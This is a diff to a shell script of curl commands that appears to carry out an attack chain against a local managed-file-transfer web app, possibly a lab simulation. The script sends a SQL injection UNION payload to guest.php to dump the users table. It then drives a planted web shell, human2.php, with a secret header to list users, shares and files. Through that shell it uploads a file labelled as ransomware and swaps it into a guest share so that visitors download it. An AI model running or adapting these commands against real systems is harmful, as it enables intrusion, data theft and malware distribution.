@@ -1,7 +1,7 @@
 BASE="http://localhost"
 KEY="execute"
-WEB_SHELL_DIR="C:\payloads\human2.php"
-RANSOMWARE_DIR="C:\payloads\installerhack.exe"
+WEB_SHELL_DIR="C:\Users\cyw50\OneDrive\바탕 화면\ganda-it-webshell\human2.php"
+RANSOMWARE_DIR="C:\Users\cyw50\OneDrive\바탕 화면\ganda-it-webshell\installerhack.exe"
 
 curl -G "$BASE/guest.php" --data-urlencode "token=x' UNION SELECT id,username,role FROM users -- -"
 
@@ -17,9 +17,13 @@ curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=users"
 
 curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=shares"
 
+curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=files"
+
 TOKEN="4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934"
 
 curl -H "X-MFT-Key: $KEY" -F "file=@$RANSOMWARE_DIR" "$BASE/uploads/human2.php?action=upload"
+
+curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=files"
 
 MALWARE_FILE_ID="5"
 
@@ -27,4 +31,4 @@ curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=replace_share&token=$
 
 curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=shares"
 
-curl -OJ "$BASE/guest.php?token=$TOKEN"
+curl -H "X-MFT-Key: $KEY" "$BASE/uploads/human2.php?action=files"
